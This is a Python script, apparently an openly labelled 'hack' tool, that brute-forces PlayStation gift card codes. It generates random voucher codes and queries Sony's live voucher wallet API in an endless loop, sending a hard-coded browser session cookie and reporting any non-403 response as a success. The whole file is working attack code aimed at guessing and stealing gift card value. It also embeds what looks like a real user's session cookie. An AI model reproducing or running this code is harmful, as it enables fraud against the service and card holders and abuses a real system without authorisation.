import requests,os,sys,time,threading,random,string
from colorama import Fore







class Playstation():
    def __init__(self):
        self.url = "https://web.np.playstation.com/api/graphql/v1/transact/wallets/vouchers/"
        self.randomcharssss = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        self.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en;q=0.5',
        'Content-Type': 'application/json',
        'X-Platform': 'CHIHIRO',
        'Access-Control-Max-Age': '600',
        'Origin': 'https://transact.playstation.com',
        'Connection': 'keep-alive',
        'Referer': 'https://transact.playstation.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'TE': 'trailers',
        'Cookie': 'AMCVS_BD260C0F53C9733E0A490D45%40AdobeOrg=1; s_ecid=MCMID%7C65385740180127324483474231628488637452; AMCV_BD260C0F53C9733E0A490D45%40AdobeOrg=-1124106680%7CMCIDTS%7C18892%7CMCMID%7C65385740180127324483474231628488637452%7CMCAAMLH-1632854282%7C6%7CMCAAMB-1632854282%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1632256682s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.2.0; isSignedIn=true; userinfo=3faa76c938529077450d96492d239ad23c3e94b713a1bae3b9491a4d0a3fc3d0; p=0; AKA_A2=A; _evidon_consent_cookie={"consent_date":"2021-09-21T18:41:58.681Z","categories":{"15":true},"vendors":{"15":{}},"cookies":{"15":true},"consent_type":1}; at_check=true; s_cc=true; eucookiepreference=accept; said=283ff8a6778f980a9fbe321ffd886e9338f25d711ad1e2b4364787bc3a0360ec; _gcl_au=1.1.444128174.1632249728; _fbp=fb.1.1632249727618.1360891156; s_fid=273EFC14F2444DF6-3FF623CDA86C417A; pdccws_p=s%3AvVH-9-J4mUG4jzhYELpT-rw76Ui03QSw.O6krSrrsDQT3zVYS4Dkw6Okmy4iTcBpBIPnCawjNYac; euconsent-v2=CPM5YnePM5Y_zASABCENBsCgAAAAAAAAAAZQINwAAQbgAAAA.YAAAAAAAAAAA; da_sid=803E8C2B8E33AE9BABB8AA13485FD2390A|3|0|3; da_lid=B30DBF189A73EA003EE9BB990A5D9832B9|0|0|0; da_intState=; mbox=session#8adf43f9171941da885870749a0bd62c#1632251716|PC#8adf43f9171941da885870749a0bd62c.35_0#1695494520; s_sq=snepdcglobal-prod%3D%2526c.%2526a.%2526activitymap.%2526page%253Dweb%25253Apdc%25253Aplaystation-gift-cards%2526link%253DGames%252520Hardware%252520Services%252520News%252520Shop%252520Support%252520fuzzy-stripe0%252520fuzzy-stripe0%252520Account%252520Settings%252520Payment%252520Management%252520Redeem%252520Codes%252520Subscript%2526region%253Dshared-nav-container%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c'
        }
        
    def CouponCode(self):
         return ''.join(random.choice(self.randomcharssss) for _ in range(4))
    def CouponCode1(self):
         return ''.join(random.choice(self.randomcharssss) for _ in range(4))
    def CouponCode2(self):
         return ''.join(random.choice(self.randomcharssss) for _ in range(4))

    def CheckCode(self):
        while True:
            giftcard = self.CouponCode() + "-" + self.CouponCode1() + "-" + self.CouponCode2()
            checkchard = requests.get(self.url+giftcard,self.headers)
            if checkchard.status_code == 403:
                print(f"[{Fore.RED}Error{Fore.RESET}] " + giftcard)
            else:
                print(f"[{Fore.GREEN}SUCCESS{Fore.RESET}] " + giftcard)

class HackIt():
    def __init__(self):
        os.system("cls && title github.com/vmthread")
        print(f'''
{Fore.LIGHTBLUE_EX}        
 ___ _              _        _   _          
| _ \ |__ _ _  _ __| |_ __ _| |_(_)___ _ _  
|  _/ / _` | || (_-<  _/ _` |  _| / _ \ ' \ 
|_| |_\__,_|\_, /__/\__\__,_|\__|_\___/_||_|
            |__/                                        
{Fore.RESET}
        ''')
HackIt()
while True:
    threading.Thread(target=Playstation().CheckCode()).start()